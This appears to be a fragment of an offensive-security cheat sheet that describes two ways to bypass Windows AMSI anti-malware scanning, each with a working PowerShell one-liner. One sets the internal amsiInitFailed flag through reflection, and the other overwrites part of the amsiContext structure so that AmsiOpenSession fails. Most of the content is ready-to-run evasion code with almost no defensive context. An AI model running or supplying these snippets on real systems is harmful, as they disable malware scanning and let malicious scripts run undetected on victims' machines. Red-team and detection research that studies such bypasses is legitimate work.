## Attack AmsiInitialize
Manipulate the initialized structure pointed out by `amsiContext` argument. 

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
```

**Cannot bypass AMSI for Assembly.Load()**


## Attack AmsiOpenSession
The 2nd QWORD of the structure pointed out by `amsiContext` argument is compared to `0`. Patch it to make the argument invalid.

```powershell
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
```

**Cannot bypass AMSI for Assembly.Load()**
